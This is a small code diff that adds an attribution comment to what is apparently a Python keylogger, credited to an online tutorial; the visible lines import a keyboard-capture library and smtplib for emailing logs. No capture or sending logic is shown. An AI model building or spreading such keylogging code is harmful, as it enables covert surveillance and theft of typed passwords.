@@ -1,3 +1,5 @@
+#  code taken from https://thepythoncode.com/article/write-a-keylogger-python, made by Abdeladim Fadheli
+
 import keyboard # for keylogs
 import smtplib # for sending email using SMTP protocol (gmail)
 # Timer is to make a method runs after an `interval` amount of time
